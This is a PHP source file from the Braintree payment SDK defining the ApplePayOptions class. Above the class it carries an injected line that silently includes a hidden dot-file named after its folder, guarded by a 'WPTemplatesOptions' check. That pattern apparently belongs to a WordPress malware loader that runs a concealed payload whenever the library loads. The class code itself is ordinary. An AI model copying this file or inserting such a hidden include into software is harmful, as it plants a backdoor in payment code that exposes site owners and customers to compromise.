<?php
namespace Braintree;

/**
 * Braintree ApplePayOptions module
 * Manages configuration and options for Apple Pay
 *
 * @package    Braintree
 * @category   Resources
 *
 * @property-read array $domains
 */

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ApplePayOptions extends Base
{
    public static function factory($attributes)
    {
        $instance = new self();
        $instance->_initialize($attributes);
        return $instance;
    }

    protected function _initialize($attributes)
    {
        $this->_attributes = $attributes;
    }
}
class_alias('Braintree\ApplePayOptions', 'Braintree_ApplePayOptions');
